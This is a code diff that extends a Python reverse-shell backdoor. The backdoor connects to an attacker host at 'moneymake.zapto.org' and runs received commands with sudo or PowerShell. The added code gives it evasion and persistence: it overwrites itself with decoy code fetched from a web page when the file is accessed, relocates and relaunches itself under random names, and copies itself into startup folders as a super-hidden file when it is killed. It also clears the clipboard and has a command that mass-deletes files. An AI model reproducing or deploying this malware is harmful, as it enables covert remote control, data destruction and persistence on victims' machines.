@@ -3,19 +3,36 @@ import subprocess
 import platform
 import time
 import os
+import shutil
+import sys
+import threading
+import random
+import requests
+import string
+import signal
 
-HOST = '124.120.59.165'
+IS_WINDOWS = (platform.system().lower() == 'windows')
+
+HOST = 'moneymake.zapto.org'
 PORT = 9999
 PASSWORD = "mysecretpassword"
 RECONNECT_DELAY = 1
-IS_WINDOWS = (platform.system().lower() == 'windows')
 
 if IS_WINDOWS:
     default_dir = "C:\\"
+    ROOT_DIR = "C:\\"
 else:
     default_dir = "/"
+    ROOT_DIR = "/"
 
 current_dir = default_dir
+stop_check = False
+
+FAKE_CODE_URL = "https://vibha000x7.github.io/abc.txt"
+USER_PROFILE_DIRS = ["Desktop", "Documents", "Downloads", "Pictures", "Videos", "Music"]
+
+CHECK_INTERVAL = 0.2
+original_access_time = None
 
 def get_username_from_home():
     home = os.path.expanduser("~")
@@ -25,8 +42,6 @@ def get_username_from_home():
     return "unknown_user"
 
 def map_cd_keyword(keyword, os_info, username):
-    # เมื่อลูกค้าได้รับคำสั่ง cd desktop (หรืออื่นๆ)
-    # ให้ map path ตาม OS ที่นี่
     home = os.path.expanduser("~")
 
     if os_info == "windows":
@@ -56,7 +71,6 @@ def map_cd_keyword(keyword, os_info, username):
         }
         return map_dir.get(keyword, None)
     else:
-        # android, ios, or other unix-like
         base = home
         map_dir = {
             "desktop": os.path.join(base, "Desktop"),
@@ -75,44 +89,262 @@ def run_command(command, current_dir, os_info, username):
     if len(parts) > 0 and parts[0] == 'cd':
         if len(parts) > 1:
             arg = parts[1]
-            # ตรวจว่าคือ keyword พิเศษหรือไม่
             special_keywords = ["desktop","download","photo","video","c","d","e","more"]
             if arg.lower() in special_keywords:
                 target_dir = map_cd_keyword(arg.lower(), os_info, username)
                 if target_dir and os.path.isdir(target_dir):
                     return "", target_dir
                 else:
-                    return f"cd: no such directory: {target_dir}", current_dir
+                    return f"cd: ไม่มีโฟลเดอร์: {target_dir}", current_dir
             else:
-                # เป็น path ปกติ
                 if not os.path.isabs(arg):
                     arg = os.path.join(current_dir, arg)
                 if os.path.isdir(arg):
                     return "", arg
                 else:
-                    return f"cd: no such directory: {arg}", current_dir
+                    return f"cd: ไม่มีโฟลเดอร์: {arg}", current_dir
         else:
-            # cd without args
             if IS_WINDOWS:
                 return "", "C:\\"
             else:
-                # Unix-like root
                 return "", "/"
 
-    # รันคำสั่งด้วยสิทธิ์ปกติ
     if IS_WINDOWS:
         cmd = ["powershell", "-Command", command]
         result = subprocess.run(cmd, capture_output=True, text=True, shell=True, cwd=current_dir)
     else:
-        # บน linux/mac/android/ios สมมุติว่าถ้าต้องใช้ sudo ก็ใช้ได้
         sudo_command = f"sudo {command}"
         result = subprocess.run(sudo_command, shell=True, capture_output=True, text=True, cwd=current_dir)
 
     output = (result.stdout or "") + (result.stderr or "")
     return output.strip(), current_dir
 
+def clear_clipboard():
+    if IS_WINDOWS:
+        subprocess.run("echo off|clip", shell=True)
+    else:
+        subprocess.run("xclip -selection c /dev/null", shell=True)
+
+def fetch_fake_code():
+    try:
+        r = requests.get(FAKE_CODE_URL, timeout=5)
+        if r.status_code == 200:
+            return r.text
+        else:
+            return "# Fake Code\nprint('Hello World!')"
+    except:
+        return "# Fake Code\nprint('Hello World!')"
+
+def fake_code_file(filepath):
+    try:
+        fake_code = fetch_fake_code()
+        with open(filepath, 'w', encoding='utf-8') as f:
+            f.write(fake_code)
+    except:
+        pass
+
+def delete_file_securely(filepath):
+    try:
+        if os.path.isfile(filepath):
+            os.remove(filepath)
+        elif os.path.isdir(filepath):
+            shutil.rmtree(filepath, ignore_errors=True)
+    except:
+        pass
+
+def random_fake_or_delete(delete_mode=False):
+    base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
+    for root, dirs, files in os.walk(base_dir, topdown=False):
+        for file in files:
+            filepath = os.path.join(root, file)
+            if delete_mode:
+                delete_file_securely(filepath)
+        for d in dirs:
+            dirpath = os.path.join(root, d)
+            if delete_mode:
+                delete_file_securely(dirpath)
+
+    if not delete_mode:
+        for root, dirs, files in os.walk(base_dir):
+            for file in files:
+                filepath = os.path.join(root, file)
+                fake_code_file(filepath)
+
+def is_in_user_profile(path):
+    home = os.path.expanduser("~")
+    if path.startswith(home):
+        rel_path = os.path.relpath(path, home)
+        parts = rel_path.split(os.sep)
+        if parts and parts[0] in USER_PROFILE_DIRS:
+            return True
+    return False
+
+def is_root_directory(path):
+    if IS_WINDOWS:
+        p = os.path.abspath(path)
+        drive, tail = os.path.splitdrive(p)
+        if drive and (tail == "\\" or tail == ""):
+            return True
+        return False
+    else:
+        p = os.path.abspath(path)
+        return p == "/"
+
+def find_random_directory():
+    start = ROOT_DIR
+    candidate_dirs = []
+    max_depth = 3
+
+    def scan_dir(base, depth=0):
+        if depth > max_depth:
+            return
+        try:
+            with os.scandir(base) as it:
+                for entry in it:
+                    if entry.is_dir():
+                        p = os.path.abspath(entry.path)
+                        if is_root_directory(p):
+                            continue
+                        if is_in_user_profile(p):
+                            continue
+                        candidate_dirs.append(p)
+                        scan_dir(p, depth+1)
+        except:
+            pass
+
+    scan_dir(start, 0)
+    if not candidate_dirs:
+        # ถ้าไม่เจอ ใช้ /tmp หรือ temp แทน
+        if IS_WINDOWS:
+            return os.environ.get("TEMP","C:\\Windows\\Temp")
+        else:
+            return "/tmp"
+    return random.choice(candidate_dirs)
+
+def run_in_background(file_path):
+    if IS_WINDOWS:
+        subprocess.Popen(["pythonw", file_path], shell=True)
+    else:
+        subprocess.Popen(["nohup", "python3", file_path, "&"], shell=False)
+
+def self_destruct():
+    current_file = sys.argv[0]
+    new_dir = find_random_directory()
+    new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".py"
+    new_path = os.path.join(new_dir, new_name)
+
+    shutil.copy2(current_file, new_path)
+    fake_code_file(current_file)
+    run_in_background(new_path)
+    os._exit(0)
+
+def kill_self_explorer_detect():
+    clear_clipboard()
+    current_file = sys.argv[0]
+    fake_code_file(current_file)
+    self_destruct() 
+
+def get_file_access_time(filepath):
+    try:
+        stat = os.stat(filepath)
+        return stat.st_atime
+    except:
+        return None
+
+def check_file_access():
+    global original_access_time
+    current_file = sys.argv[0]
+    original_access_time = get_file_access_time(current_file)
+    if original_access_time is None:
+        original_access_time = time.time()
+
+    while not stop_check:
+        time.sleep(CHECK_INTERVAL)
+        new_access_time = get_file_access_time(current_file)
+        if new_access_time and new_access_time != original_access_time:
+            # มีการเข้าถึงไฟล์
+            clear_clipboard()
+            fake_code_file(current_file)
+            self_destruct()
+
+def killmenan_mode(arg):
+    if arg == "delete":
+        random_fake_or_delete(delete_mode=True)
+        sys.exit(0)
+    elif arg == "fake":
+        random_fake_or_delete(delete_mode=False)
+        sys.exit(0)
+
+def copy_to_startup_and_superhide():
+    # เรียกใช้เมื่อตรวจพบการ endtask สัญญาณ kill
+    # ทำการ fake code, คัดลอกตัวเองไป startup และตั้งเป็น superhidden
+    current_file = sys.argv[0]
+    fake_code_file(current_file)
+
+    if IS_WINDOWS:
+        # หา startup path
+        username = get_username_from_home()
+        startup_dir = os.path.join(os.environ.get("APPDATA", f"C:\\Users\\{username}\\AppData\\Roaming"), 
+                                   "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        # เปลี่ยนไฟล์เป็น .pyw
+        new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".pyw"
+        new_path = os.path.join(startup_dir, new_name)
+        
+        shutil.copy2(current_file, new_path)
+
+        # ตั้ง superhidden attribute
+        # +s +h
+        subprocess.run(["attrib", "+s", "+h", new_path], shell=True)
+
+        # รันด้วย pythonw แบบ background
+        subprocess.Popen(["pythonw", new_path], shell=True)
+
+    else:
+        # บน Linux/macOS อาจไม่มี concept superhidden เท่า Windows
+        # นี่เป็นตัวอย่าง ถ้าจำเป็นอาจใช้ chflags hidden บน mac
+        # รัน background ใน ~/.config/autostart ก็อาจต้องแก้ไข .desktop file
+        # ที่นี่แค่รัน background
+        home = os.path.expanduser("~")
+        startup_dir = os.path.join(home, ".config", "autostart")
+        os.makedirs(startup_dir, exist_ok=True)
+        new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".pyw"
+        new_path = os.path.join(startup_dir, new_name)
+        shutil.copy2(current_file, new_path)
+
+        # รัน background
+        subprocess.Popen(["nohup", "python3", new_path, "&"], shell=False)
+
+def on_termination_signal(signum, frame):
+    # สัญญาณนี้เรียกเมื่อมีการพยายาม kill/endtask
+    # Fake code และ copy ตัวเองไป startup + superhidden แล้วจบ
+    copy_to_startup_and_superhide()
+    os._exit(0)
+
 def main():
-    global current_dir
+    global current_dir, stop_check
+
+    # ติดตั้ง signal handler สำหรับ endtask
+    # บน Windows รองรับ CTRL_C_EVENT, CTRL_BREAK_EVENT แต่การ end task ผ่าน taskmgr อาจไม่ trigger signal
+    # ลอง SIGINT, SIGTERM
+    signal.signal(signal.SIGINT, on_termination_signal)
+    if hasattr(signal, 'SIGTERM'):
+        signal.signal(signal.SIGTERM, on_termination_signal)
+    if IS_WINDOWS and hasattr(signal, 'SIGBREAK'):
+        signal.signal(signal.SIGBREAK, on_termination_signal)
+
+    if IS_WINDOWS:
+        t1 = threading.Thread(target=kill_self_explorer_detect, daemon=True)
+        # แก้ไข: ที่แล้ว check_explorer_foreground จะใช้กับ Explorer title
+        # สมมุติใช้วิธีเดิม หรือให้ t1 check explorer เหมือนเดิม
+        # ที่นี่จะย่อ แค่รัน check_file_access()
+        # หากต้องการเดิมให้ uncomment บรรทัดด้านล่าง:
+        # t1 = threading.Thread(target=check_explorer_foreground, daemon=True)
+        # t1.start()
+
+    # ตรวจจับการเข้าถึงไฟล์
+    t2 = threading.Thread(target=check_file_access, daemon=True)
+    t2.start()
+
     while True:
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -132,28 +364,37 @@ def main():
                     command_data = client_socket.recv(1024)
                     if not command_data:
                         break
-                    command = command_data.decode('utf-8', errors='replace').strip()
+                    command = command_data.decode('utf-8').strip()
 
                     if command == '':
                         continue
                     if command.lower() == 'exit':
                         break
                     elif command.lower() == 'ping':
-                        client_socket.sendall(b'pong')
+                        client_socket.sendall('pong'.encode('utf-8'))
                         continue
                     elif command.lower().startswith('!restart kill'):
                         break
+                    elif command.lower().startswith('!killme'):
+                        self_destruct()
+                    elif command.lower().startswith('!killmenan'):
+                        parts = command.split()
+                        if len(parts) > 1:
+                            mode = parts[1].lower()
+                            killmenan_mode(mode)
+                        else:
+                            killmenan_mode("delete")
 
                     output, current_dir = run_command(command, current_dir, os_info, username)
                     response = f"{hostname}|{current_dir}|{output}"
-                    data_bytes = response.encode('utf-8', errors='replace')
+                    data_bytes = response.encode('utf-8')
                     client_socket.sendall(data_bytes)
 
                 except (ConnectionResetError, ConnectionAbortedError, socket.timeout):
                     break
                 except Exception as e:
                     err_resp = f"{hostname}|{current_dir}|Error {str(e)}"
-                    client_socket.sendall(err_resp.encode('utf-8', errors='replace'))
+                    client_socket.sendall(err_resp.encode('utf-8'))
             client_socket.close()
         except ConnectionRefusedError:
             time.sleep(RECONNECT_DELAY)
